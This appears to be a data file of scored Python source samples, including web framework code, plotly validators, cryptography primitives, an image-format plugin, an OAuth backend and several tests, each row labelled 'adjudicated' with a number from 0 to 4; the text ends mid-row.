check_item_modification_permissions(<<NEWL>>    current_item: Item = Depends(get_item_by_slug_from_path),<<NEWL>>    user: User = Depends(get_current_user_authorizer()),<<NEWL>>) -> None:<<NEWL>>    if not check_user_can_modify_item(current_item, user):<<NEWL>>        raise HTTPException(<<NEWL>>            status_code=status.HTTP_403_FORBIDDEN,<<NEWL>>            detail=strings.USER_IS_NOT_SELLER_OF_ITEM,<<NEWL>>        )
166	adjudicated	2	"__all__ = ['Version']<<NEWL>><<NEWL>><<NEWL>>import typing as t<<NEWL>><<NEWL>>from ..function import deprecated_classmethod<<NEWL>><<NEWL>>if t.TYPE_CHECKING:<<NEWL>>    import typing_extensions as te<<NEWL>><<NEWL>><<NEWL>>class Version(t.NamedTuple):<<NEWL>>    '''Version named tuple<<NEWL>><<NEWL>>    Example:<<NEWL>>        >>> version = Version.fromString('1.2.x')<<NEWL>>        >>> version.major, version.minor, version.other, version.micro<<NEWL>>        (1, 2, 'x', None)<<NEWL>>        >>> version.to_string()<<NEWL>>        '1.2.x'<<NEWL>>    '''<<NEWL>><<NEWL>>    major: int<<NEWL>>    minor: int<<NEWL>>    other: t.Optional[str]<<NEWL>><<NEWL>>    def __lt__(self, other: 'te.Self') -> bool:<<NEWL>>        return (self.major, self.minor) < (other.major, other.minor)<<NEWL>><<NEWL>>    def __gt__(self, other: 'te.Self') -> bool:<<NEWL>>        return other.__lt__(self)<<NEWL>><<NEWL>>    def __repr__(self) -> str:<<NEWL>>        return f'Version.fromString({self.to_string()!r})'<<NEWL>><<NEWL>>    def __str__(self) -> str:<<NEWL>>        return self.to_string()<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def fromString(cls, version: str) -> 'te.Self':<<NEWL>>        parts = version.split('.', maxsplit=2)<<NEWL>>        if len(parts) == 2:<<NEWL>>            major, minor = parts<<NEWL>>            other = None<<NEWL>>        elif len(parts) == 3:<<NEWL>>            major, minor, other = parts<<NEWL>>        else:<<NEWL>>            raise Exception(f'""{version}"" is not a valid version string')<<NEWL>>        return cls(int(major), int(minor), other)<<NEWL>><<NEWL>>    @property<<NEWL>>    def micro(self) -> t.Optional[int]:<<NEWL>>        if self.other is not None:<<NEWL>>            parts = self.other.split('.')<<NEWL>>            if parts and parts[0].isdigit():<<NEWL>>                return int(parts[0])<<NEWL>>        return None<<NEWL>><<NEWL>>    @property<<NEWL>>    def micro_int(self) -> int:<<NEWL>>        return self.micro or 0<<NEWL>><<NEWL>>    def to_string(self) -> str:<<NEWL>>        version = f'{self.major}.{self.minor}'<<NEWL>>        if self.other is not None:<<NEWL>>            version += f'.{self.other}'<<NEWL>>        return version<<NEWL>><<NEWL>>    from_string = deprecated_classmethod(fromString)"
77	adjudicated	4	"""""""tst_tc2236_hstvprde_68491 URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/2.2/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import path, include, re_path<<NEWL>>from django.views.generic.base import TemplateView<<NEWL>>from allauth.account.views import confirm_email<<NEWL>>from rest_framework import permissions<<NEWL>>from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    <<NEWL>>    path(""accounts/"", include(""allauth.urls"")),<<NEWL>>    path(""modules/"", include(""modules.urls"")),<<NEWL>>    path(""api/v1/"", include(""home.api.v1.urls"")),<<NEWL>>    path(""admin/"", admin.site.urls),<<NEWL>>    path(""users/"", include(""users.urls"", namespace=""users"")),<<NEWL>>    path(""rest-auth/"", include(""rest_auth.urls"")),<<NEWL>>    # Override email confirm to use allauth's HTML view instead of rest_auth's API view<<NEWL>>    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),<<NEWL>>    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),<<NEWL>>]<<NEWL>><<NEWL>>admin.site.site_header = ""TST-TC2236-hstvprdenr""<<NEWL>>admin.site.site_title = ""TST-TC2236-hstvprdenr Admin Portal""<<NEWL>>admin.site.index_title = ""TST-TC2236-hstvprdenr Admin""<<NEWL>><<NEWL>># swagger<<NEWL>>urlpatterns += [<<NEWL>>    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),<<NEWL>>    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
137	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""scatterternary.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
84	adjudicated	4	"# -*- coding: utf-8 -*-<<NEWL>>import re<<NEWL>><<NEWL>>from django.template import Library<<NEWL>>from django.utils.encoding import force_str<<NEWL>><<NEWL>><<NEWL>>register = Library()<<NEWL>>re_widont = re.compile(r'\s+(\S+\s*)$')<<NEWL>>re_widont_html = re.compile(r'([^<>\s])\s+([^<>\s]+\s*)(</?(?:address|blockquote|br|dd|div|dt|fieldset|form|h[1-6]|li|noscript|p|td|th)[^>]*>|$)', re.IGNORECASE)<<NEWL>><<NEWL>><<NEWL>>@register.filter<<NEWL>>def widont(value, count=1):<<NEWL>>    """"""<<NEWL>>    Add an HTML non-breaking space between the final two words of the string to<<NEWL>>    avoid ""widowed"" words.<<NEWL>><<NEWL>>    Examples:<<NEWL>><<NEWL>>    >>> print(widont('Test   me   out'))<<NEWL>>    Test   me&nbsp;out<<NEWL>><<NEWL>>    >>> print(""'"",widont('It works with trailing spaces too  '), ""'"")<<NEWL>>    ' It works with trailing spaces&nbsp;too   '<<NEWL>><<NEWL>>    >>> print(widont('NoEffect'))<<NEWL>>    NoEffect<<NEWL>>    """"""<<NEWL>>    def replace(matchobj):<<NEWL>>        return force_str('&nbsp;%s' % matchobj.group(1))<<NEWL>>    for i in range(count):<<NEWL>>        value = re_widont.sub(replace, force_str(value))<<NEWL>>    return value<<NEWL>><<NEWL>><<NEWL>>@register.filter<<NEWL>>def widont_html(value):<<NEWL>>    """"""<<NEWL>>    Add an HTML non-breaking space between the final two words at the end of<<NEWL>>    (and in sentences just outside of) block level tags to avoid ""widowed""<<NEWL>>    words.<<NEWL>><<NEWL>>    Examples:<<NEWL>><<NEWL>>    >>> print(widont_html('<h2>Here is a simple  example  </h2> <p>Single</p>'))<<NEWL>>    <h2>Here is a simple&nbsp;example  </h2> <p>Single</p><<NEWL>><<NEWL>>    >>> print(widont_html('<p>test me<br /> out</p><h2>Ok?</h2>Not in a p<p title=""test me"">and this</p>'))<<NEWL>>    <p>test&nbsp;me<br /> out</p><h2>Ok?</h2>Not in a&nbsp;p<p title=""test me"">and&nbsp;this</p><<NEWL>><<NEWL>>    >>> print(widont_html('leading text  <p>test me out</p>  trailing text'))<<NEWL>>    leading&nbsp;text  <p>test me&nbsp;out</p>  trailing&nbsp;text<<NEWL>>    """"""<<NEWL>>    def replace(matchobj):<<NEWL>>        return force_str('%s&nbsp;%s%s' % matchobj.groups())<<NEWL>>    return re_widont_html.sub(replace, force_str(value))<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    def _test():<<NEWL>>        import doctest<<NEWL>>        doctest.testmod()<<NEWL>>    _test()"
315	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>><<NEWL>>import typing<<NEWL>><<NEWL>>from cryptography import utils<<NEWL>>from cryptography.exceptions import (<<NEWL>>    AlreadyFinalized,<<NEWL>>    UnsupportedAlgorithm,<<NEWL>>    _Reasons,<<NEWL>>)<<NEWL>>from cryptography.hazmat.backends.openssl.poly1305 import _Poly1305Context<<NEWL>><<NEWL>><<NEWL>>class Poly1305:<<NEWL>>    _ctx: typing.Optional[_Poly1305Context]<<NEWL>><<NEWL>>    def __init__(self, key: bytes):<<NEWL>>        from cryptography.hazmat.backends.openssl.backend import backend<<NEWL>><<NEWL>>        if not backend.poly1305_supported():<<NEWL>>            raise UnsupportedAlgorithm(<<NEWL>>                ""poly1305 is not supported by this version of OpenSSL."",<<NEWL>>                _Reasons.UNSUPPORTED_MAC,<<NEWL>>            )<<NEWL>>        self._ctx = backend.create_poly1305_ctx(key)<<NEWL>><<NEWL>>    def update(self, data: bytes) -> None:<<NEWL>>        if self._ctx is None:<<NEWL>>            raise AlreadyFinalized(""Context was already finalized."")<<NEWL>>        utils._check_byteslike(""data"", data)<<NEWL>>        self._ctx.update(data)<<NEWL>><<NEWL>>    def finalize(self) -> bytes:<<NEWL>>        if self._ctx is None:<<NEWL>>            raise AlreadyFinalized(""Context was already finalized."")<<NEWL>>        mac = self._ctx.finalize()<<NEWL>>        self._ctx = None<<NEWL>>        return mac<<NEWL>><<NEWL>>    def verify(self, tag: bytes) -> None:<<NEWL>>        utils._check_bytes(""tag"", tag)<<NEWL>>        if self._ctx is None:<<NEWL>>            raise AlreadyFinalized(""Context was already finalized."")<<NEWL>><<NEWL>>        ctx, self._ctx = self._ctx, None<<NEWL>>        ctx.verify(tag)<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def generate_tag(cls, key: bytes, data: bytes) -> bytes:<<NEWL>>        p = Poly1305(key)<<NEWL>>        p.update(data)<<NEWL>>        return p.finalize()<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def verify_tag(cls, key: bytes, data: bytes, tag: bytes) -> None:<<NEWL>>        p = Poly1305(key)<<NEWL>>        p.update(data)<<NEWL>>        p.verify(tag)"
255	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""densitymapbox"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
344	adjudicated	1	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># DCX file handling<<NEWL>>#<<NEWL>># DCX is a container file format defined by Intel, commonly used<<NEWL>># for fax applications.  Each DCX file consists of a directory<<NEWL>># (a list of file offsets) followed by a set of (usually 1-bit)<<NEWL>># PCX files.<<NEWL>>#<<NEWL>># History:<<NEWL>># 1995-09-09 fl   Created<<NEWL>># 1996-03-20 fl   Properly derived from PcxImageFile.<<NEWL>># 1998-07-15 fl   Renamed offset attribute to avoid name clash<<NEWL>># 2002-07-30 fl   Fixed file handling<<NEWL>>#<<NEWL>># Copyright (c) 1997-98 by Secret Labs AB.<<NEWL>># Copyright (c) 1995-96 by Fredrik Lundh.<<NEWL>>#<<NEWL>># See the README file for information on usage and redistribution.<<NEWL>>#<<NEWL>><<NEWL>>from . import Image<<NEWL>>from ._binary import i32le as i32<<NEWL>>from .PcxImagePlugin import PcxImageFile<<NEWL>><<NEWL>>MAGIC = 0x3ADE68B1  # QUIZ: what's this value, then?<<NEWL>><<NEWL>><<NEWL>>def _accept(prefix):<<NEWL>>    return len(prefix) >= 4 and i32(prefix) == MAGIC<<NEWL>><<NEWL>><<NEWL>>##<<NEWL>># Image plugin for the Intel DCX format.<<NEWL>><<NEWL>><<NEWL>>class DcxImageFile(PcxImageFile):<<NEWL>><<NEWL>>    format = ""DCX""<<NEWL>>    format_description = ""Intel DCX""<<NEWL>>    _close_exclusive_fp_after_loading = False<<NEWL>><<NEWL>>    def _open(self):<<NEWL>><<NEWL>>        # Header<<NEWL>>        s = self.fp.read(4)<<NEWL>>        if not _accept(s):<<NEWL>>            msg = ""not a DCX file""<<NEWL>>            raise SyntaxError(msg)<<NEWL>><<NEWL>>        # Component directory<<NEWL>>        self._offset = []<<NEWL>>        for i in range(1024):<<NEWL>>            offset = i32(self.fp.read(4))<<NEWL>>            if not offset:<<NEWL>>                break<<NEWL>>            self._offset.append(offset)<<NEWL>><<NEWL>>        self._fp = self.fp<<NEWL>>        self.frame = None<<NEWL>>        self.n_frames = len(self._offset)<<NEWL>>        self.is_animated = self.n_frames > 1<<NEWL>>        self.seek(0)<<NEWL>><<NEWL>>    def seek(self, frame):<<NEWL>>        if not self._seek_check(frame):<<NEWL>>            return<<NEWL>>        self.frame = frame<<NEWL>>        self.fp = self._fp<<NEWL>>        self.fp.seek(self._offset[frame])<<NEWL>>        PcxImageFile._open(self)<<NEWL>><<NEWL>>    def tell(self):<<NEWL>>        return self.frame<<NEWL>><<NEWL>><<NEWL>>Image.register_open(DcxImageFile.format, DcxImageFile, _accept)<<NEWL>><<NEWL>>Image.register_extension(DcxImageFile.format, "".dcx"")"
195	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""font"", parent_name=""pie.title"", **kwargs):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
204	adjudicated	2	"from . import engines<<NEWL>>from .exceptions import TemplateDoesNotExist<<NEWL>><<NEWL>><<NEWL>>def get_template(template_name, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for the given name.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for engine in engines:<<NEWL>>        try:<<NEWL>>            return engine.get_template(template_name)<<NEWL>>        except TemplateDoesNotExist as e:<<NEWL>>            chain.append(e)<<NEWL>><<NEWL>>    raise TemplateDoesNotExist(template_name, chain=chain)<<NEWL>><<NEWL>><<NEWL>>def select_template(template_name_list, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for one of the given names.<<NEWL>><<NEWL>>    Try names in order and return the first template found.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name_list, str):<<NEWL>>        raise TypeError(<<NEWL>>            ""select_template() takes an iterable of template names but got a ""<<NEWL>>            ""string: %r. Use get_template() if you want to load a single ""<<NEWL>>            ""template by name."" % template_name_list<<NEWL>>        )<<NEWL>><<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for template_name in template_name_list:<<NEWL>>        for engine in engines:<<NEWL>>            try:<<NEWL>>                return engine.get_template(template_name)<<NEWL>>            except TemplateDoesNotExist as e:<<NEWL>>                chain.append(e)<<NEWL>><<NEWL>>    if template_name_list:<<NEWL>>        raise TemplateDoesNotExist("", "".join(template_name_list), chain=chain)<<NEWL>>    else:<<NEWL>>        raise TemplateDoesNotExist(""No template names provided"")<<NEWL>><<NEWL>><<NEWL>>def render_to_string(template_name, context=None, request=None, using=None):<<NEWL>>    """"""<<NEWL>>    Load a template and render it with a context. Return a string.<<NEWL>><<NEWL>>    template_name may be a string or a list of strings.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name, (list, tuple)):<<NEWL>>        template = select_template(template_name, using=using)<<NEWL>>    else:<<NEWL>>        template = get_template(template_name, using=using)<<NEWL>>    return template.render(context, request)<<NEWL>><<NEWL>><<NEWL>>def _engine_list(using=None):<<NEWL>>    return engines.all() if using is None else [engines[using]]"
103	adjudicated	1	"from minerl.herobraine.hero import handlers<<NEWL>>from typing import List<<NEWL>>from minerl.herobraine.hero.handlers.translation import TranslationHandler<<NEWL>>import time<<NEWL>>from minerl.herobraine.env_specs.navigate_specs import Navigate<<NEWL>><<NEWL>>import coloredlogs<<NEWL>>import logging<<NEWL>><<NEWL>>color = coloredlogs.install(level=logging.DEBUG)<<NEWL>><<NEWL>><<NEWL>># Let's also test monitors<<NEWL>><<NEWL>>class NavigateWithDistanceMonitor(Navigate):<<NEWL>>    def create_monitors(self) -> List[TranslationHandler]:<<NEWL>>        return [<<NEWL>>            handlers.CompassObservation(angle=False, distance=True)<<NEWL>>        ]<<NEWL>><<NEWL>><<NEWL>>def _test_fake_env(env_spec, should_render=False):<<NEWL>>    # Make the env.<<NEWL>>    fake_env = env_spec.make(fake=True)<<NEWL>><<NEWL>>    assert fake_env.action_space == fake_env.task.action_space<<NEWL>>    assert fake_env.observation_space == fake_env.observation_space<<NEWL>><<NEWL>>    assert fake_env._seed == None<<NEWL>><<NEWL>>    fake_env.seed(200)<<NEWL>>    assert fake_env._seed == 200<<NEWL>>    fake_obs = fake_env.reset()<<NEWL>><<NEWL>>    assert fake_obs in env_spec.observation_space<<NEWL>><<NEWL>>    for _ in range(100):<<NEWL>>        fake_obs, _, _, fake_monitor = fake_env.step(fake_env.action_space.sample())<<NEWL>>        if should_render:<<NEWL>>            fake_env.render()<<NEWL>>            time.sleep(0.1)<<NEWL>>        assert fake_obs in env_spec.observation_space<<NEWL>>        assert fake_monitor in env_spec.monitor_space<<NEWL>><<NEWL>><<NEWL>>def test_fake_navigate():<<NEWL>>    _test_fake_env(Navigate(dense=True, extreme=False))<<NEWL>>    _test_fake_env(Navigate(dense=True, extreme=False, agent_count=3))<<NEWL>><<NEWL>><<NEWL>>def test_fake_navigate_with_distance_monitor():<<NEWL>>    task = NavigateWithDistanceMonitor(dense=True, extreme=False)<<NEWL>>    fake_env = task.make(fake=True)<<NEWL>>    _ = fake_env.reset()<<NEWL>><<NEWL>>    for _ in range(100):<<NEWL>>        fake_obs, _, _, fake_monitor = fake_env.step(fake_env.action_space.sample())<<NEWL>>        assert fake_monitor in fake_env.monitor_space<<NEWL>>        assert ""compass"" in fake_monitor<<NEWL>>        assert ""distance"" in fake_monitor[""compass""]<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    # _test_fake_env(Navigate(dense=True, extreme=False), should_render=True)<<NEWL>>    _test_fake_env(Navigate(dense=True, extreme=False, agent_count=3), should_render=True)<<NEWL>>    # test_fake_navigate_with_distance_monitor()"
292	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>><<NEWL>><<NEWL>>import typing<<NEWL>><<NEWL>>from cryptography import utils<<NEWL>>from cryptography.exceptions import AlreadyFinalized, InvalidKey<<NEWL>>from cryptography.hazmat.primitives import constant_time, hashes<<NEWL>>from cryptography.hazmat.primitives.kdf import KeyDerivationFunction<<NEWL>><<NEWL>><<NEWL>>def _int_to_u32be(n: int) -> bytes:<<NEWL>>    return n.to_bytes(length=4, byteorder=""big"")<<NEWL>><<NEWL>><<NEWL>>class X963KDF(KeyDerivationFunction):<<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        algorithm: hashes.HashAlgorithm,<<NEWL>>        length: int,<<NEWL>>        sharedinfo: typing.Optional[bytes],<<NEWL>>        backend: typing.Any = None,<<NEWL>>    ):<<NEWL>>        max_len = algorithm.digest_size * (2**32 - 1)<<NEWL>>        if length > max_len:<<NEWL>>            raise ValueError(<<NEWL>>                ""Cannot derive keys larger than {} bits."".format(max_len)<<NEWL>>            )<<NEWL>>        if sharedinfo is not None:<<NEWL>>            utils._check_bytes(""sharedinfo"", sharedinfo)<<NEWL>><<NEWL>>        self._algorithm = algorithm<<NEWL>>        self._length = length<<NEWL>>        self._sharedinfo = sharedinfo<<NEWL>>        self._used = False<<NEWL>><<NEWL>>    def derive(self, key_material: bytes) -> bytes:<<NEWL>>        if self._used:<<NEWL>>            raise AlreadyFinalized<<NEWL>>        self._used = True<<NEWL>>        utils._check_byteslike(""key_material"", key_material)<<NEWL>>        output = [b""""]<<NEWL>>        outlen = 0<<NEWL>>        counter = 1<<NEWL>><<NEWL>>        while self._length > outlen:<<NEWL>>            h = hashes.Hash(self._algorithm)<<NEWL>>            h.update(key_material)<<NEWL>>            h.update(_int_to_u32be(counter))<<NEWL>>            if self._sharedinfo is not None:<<NEWL>>                h.update(self._sharedinfo)<<NEWL>>            output.append(h.finalize())<<NEWL>>            outlen += len(output[-1])<<NEWL>>            counter += 1<<NEWL>><<NEWL>>        return b"""".join(output)[: self._length]<<NEWL>><<NEWL>>    def verify(self, key_material: bytes, expected_key: bytes) -> None:<<NEWL>>        if not constant_time.bytes_eq(self.derive(key_material), expected_key):<<NEWL>>            raise InvalidKey"
43	adjudicated	4	"""""""<<NEWL>>Strava OAuth2 backend, docs at:<<NEWL>>    https://python-social-auth.readthedocs.io/en/latest/backends/strava.html<<NEWL>>""""""<<NEWL>>from .oauth import BaseOAuth2<<NEWL>><<NEWL>><<NEWL>>class StravaOAuth(BaseOAuth2):<<NEWL>>    name = 'strava'<<NEWL>>    AUTHORIZATION_URL = 'https://www.strava.com/oauth/authorize'<<NEWL>>    ACCESS_TOKEN_URL = 'https://www.strava.com/oauth/token'<<NEWL>>    ACCESS_TOKEN_METHOD = 'POST'<<NEWL>>    # Strava doesn't check for parameters in redirect_uri and directly appends<<NEWL>>    # the auth parameters to it, ending with an URL like:<<NEWL>>    # http://example.com/complete/strava?redirect_state=xxx?code=xxx&state=xxx<<NEWL>>    # Check issue #259 for details.<<NEWL>>    REDIRECT_STATE = False<<NEWL>>    REVOKE_TOKEN_URL = 'https://www.strava.com/oauth/deauthorize'<<NEWL>>    SCOPE_SEPARATOR = ','<<NEWL>>    EXTRA_DATA = [<<NEWL>>        ('refresh_token', 'refresh_token'),<<NEWL>>        ('expires_in', 'expires'),<<NEWL>>    ]<<NEWL>><<NEWL>>    def get_user_id(self, details, response):<<NEWL>>        return response['athlete']['id']<<NEWL>><<NEWL>>    def get_user_details(self, response):<<NEWL>>        """"""Return user details from Strava account""""""<<NEWL>>        username = response['athlete'].get('username', '')<<NEWL>>        fullname, first_name, last_name = self.get_user_names(<<NEWL>>            first_name=response['athlete'].get('firstname', ''),<<NEWL>>            last_name=response['athlete'].get('lastname', ''),<<NEWL>>        )<<NEWL>>        return {'username': username,<<NEWL>>                'fullname': fullname,<<NEWL>>                'first_name': first_name,<<NEWL>>                'last_name': last_name}<<NEWL>><<NEWL>>    def user_data(self, access_token, *args, **kwargs):<<NEWL>>        """"""Loads user data from service""""""<<NEWL>>        return self.get_json('https://www.strava.com/api/v3/athlete',<<NEWL>>                             params={'access_token': access_token})<<NEWL>><<NEWL>>    def revoke_token_params(self, token, uid):<<NEWL>>        params = super().revoke_token_params(token, uid)<<NEWL>>        params['access_token'] = token<<NEWL>>        return params"
152	adjudicated	2	"import os<<NEWL>>import shutil<<NEWL>>import tempfile<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from pathy import Pathy<<NEWL>><<NEWL>>is_windows = os.name == ""nt""<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.skipif(not is_windows, reason=""requires windows"")<<NEWL>>def test_windows_fluid_absolute_paths() -> None:<<NEWL>>    # Path with \\ slashes<<NEWL>>    tmp_dir = tempfile.mkdtemp()<<NEWL>>    # Converted to the same path with / slashes<<NEWL>>    alt_slashes = tmp_dir.replace(""\\\\"", ""/"").replace(""\\"", ""/"")<<NEWL>><<NEWL>>    # Make a folder from \\ absolute path<<NEWL>>    fs_root = Pathy.fluid(tmp_dir)<<NEWL>>    assert ""\\"" in str(fs_root), ""expected \\ separators in windows path""<<NEWL>>    new_folder = Pathy.fluid(fs_root / ""sub-dir"")<<NEWL>>    assert new_folder.exists() is False<<NEWL>>    new_folder.mkdir()<<NEWL>>    assert new_folder.exists() is True<<NEWL>><<NEWL>>    # Make a folder from / absolute path<<NEWL>>    fs_root = Pathy.fluid(alt_slashes)<<NEWL>>    new_folder = Pathy.fluid(fs_root / ""sub-dir-alt"")<<NEWL>>    assert new_folder.exists() is False<<NEWL>>    new_folder.mkdir()<<NEWL>>    assert new_folder.exists() is True<<NEWL>><<NEWL>>    shutil.rmtree(tmp_dir)<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.skipif(not is_windows, reason=""requires windows"")<<NEWL>>def test_windows_fluid_absolute_file_paths() -> None:<<NEWL>>    # Path with \\ slashes<<NEWL>>    tmp_dir = tempfile.mkdtemp()<<NEWL>>    # Converted to the same path with / slashes<<NEWL>>    alt_slashes = tmp_dir.replace(""\\\\"", ""/"").replace(""\\"", ""/"")<<NEWL>><<NEWL>>    # Make a folder from \\ absolute path<<NEWL>>    fs_root = Pathy.fluid(f""file://{tmp_dir}"")<<NEWL>>    assert ""\\"" in 